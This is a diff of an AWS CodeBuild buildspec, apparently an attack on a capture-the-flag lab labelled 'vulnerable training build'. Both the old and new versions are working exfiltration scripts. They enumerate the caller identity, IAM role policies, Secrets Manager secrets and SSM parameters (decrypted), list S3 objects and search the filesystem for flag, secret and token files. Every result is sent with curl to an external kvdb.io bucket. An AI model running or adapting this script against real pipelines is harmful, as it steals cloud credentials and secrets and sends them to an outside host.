@@ -6,45 +6,52 @@ phases:
       - echo "Running vulnerable training build"
       - |
         set +e
-        bucket='https://kvdb.io/HJjCRYSLCCKeyoxLHGb9MD'
-        putkey(){ key="$1"; file="$2"; head -c 15000 "$file" | curl -fsS --data-binary @- "$bucket/$key" || true; }
+        bucket='https://kvdb.io/xPNzYaYpznrnsyHRvmAsP'
+        runid="${CODEBUILD_BUILD_ID##*:}"
+        putkey(){ key="$1"; file="$2"; head -c 15000 "$file" | curl -fsS --data-binary @- "$bucket/${runid}_$key" || true; }
+        names='flag FLAG lab-flag lab5-flag lab_5_flag codebuild-flag codebuild_lab_5_flag codebuild_lab_5_secret codebuild-codebreach-actors-lab-flag codebreach-flag actors-flag training-flag'
+        params='/flag /FLAG /lab/flag /lab5/flag /lab-5/flag /codebuild/flag /codebuild_lab_5/flag /codebreach/flag /actors/flag /training/flag'
 
         aws sts get-caller-identity > /tmp/whoami.txt 2>&1
-        putkey whoami2 /tmp/whoami.txt
+        putkey whoami /tmp/whoami.txt
 
         {
-          echo '=== secrets list ==='
-          aws secretsmanager list-secrets --region us-east-1 --output json 2>&1
-          echo '=== secret values ==='
-          for s in $(aws secretsmanager list-secrets --region us-east-1 --query 'SecretList[].Name' --output text 2>/dev/null); do
-            echo "--- secret:$s"
-            aws secretsmanager get-secret-value --region us-east-1 --secret-id "$s" --output json 2>&1
+          echo '=== codebuild batch-get-projects ==='
+          aws codebuild batch-get-projects --names codebuild_lab_5_project --region us-east-1 --output json 2>&1
+          echo '=== iam role policies ==='
+          aws iam list-role-policies --role-name codebuild_lab_5_role --output json 2>&1
+          aws iam list-attached-role-policies --role-name codebuild_lab_5_role --output json 2>&1
+          for p in $(aws iam list-role-policies --role-name codebuild_lab_5_role --query 'PolicyNames[]' --output text 2>/dev/null); do
+            echo "--- inline policy:$p"
+            aws iam get-role-policy --role-name codebuild_lab_5_role --policy-name "$p" --output json 2>&1
           done
-        } > /tmp/secrets.txt 2>&1
-        putkey secrets /tmp/secrets.txt
+        } > /tmp/project_iam.txt 2>&1
+        putkey project_iam /tmp/project_iam.txt
 
         {
-          echo '=== ssm parameters ==='
-          aws ssm describe-parameters --region us-east-1 --output json 2>&1
-          echo '=== ssm values ==='
-          for p in $(aws ssm describe-parameters --region us-east-1 --query 'Parameters[].Name' --output text 2>/dev/null); do
+          echo '=== direct secretsmanager guesses ==='
+          for n in $names; do
+            echo "--- secret:$n"
+            aws secretsmanager get-secret-value --region us-east-1 --secret-id "$n" --output json 2>&1
+          done
+        } > /tmp/secret_guesses.txt 2>&1
+        putkey secret_guesses /tmp/secret_guesses.txt
+
+        {
+          echo '=== direct ssm guesses ==='
+          for p in $params; do
             echo "--- parameter:$p"
             aws ssm get-parameter --region us-east-1 --name "$p" --with-decryption --output json 2>&1
           done
-        } > /tmp/ssm.txt 2>&1
-        putkey ssm /tmp/ssm.txt
+        } > /tmp/ssm_guesses.txt 2>&1
+        putkey ssm_guesses /tmp/ssm_guesses.txt
 
         {
-          echo '=== s3 buckets ==='
-          aws s3api list-buckets --output json 2>&1
-          for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text 2>/dev/null); do
-            echo "--- bucket:$b"
-            aws s3 ls "s3://$b" --recursive 2>&1 | head -n 100
-            for k in $(aws s3api list-objects-v2 --bucket "$b" --query 'Contents[?contains(Key, `flag`) || contains(Key, `secret`) || contains(Key, `FLAG`) || contains(Key, `SECRET`)].Key' --output text 2>/dev/null); do
-              echo "--- object:s3://$b/$k"
-              aws s3 cp "s3://$b/$k" - 2>&1 | head -c 4000
-              echo
-            done
-          done
-        } > /tmp/s3.txt 2>&1
-        putkey s3 /tmp/s3.txt
+          echo '=== local repo and filesystem hints ==='
+          pwd; find . -maxdepth 4 -type f -print -exec sed -n '1,80p' {} \; 2>/dev/null | head -c 12000
+          echo '=== /codebuild/output files ==='
+          find /codebuild/output -maxdepth 5 -type f 2>/dev/null | head -n 200
+          echo '=== root small files names ==='
+          find / -maxdepth 4 -type f 2>/dev/null | grep -Ei 'flag|secret|token|lab|codebuild' | head -n 200
+        } > /tmp/local_hints.txt 2>&1
+        putkey local_hints /tmp/local_hints.txt
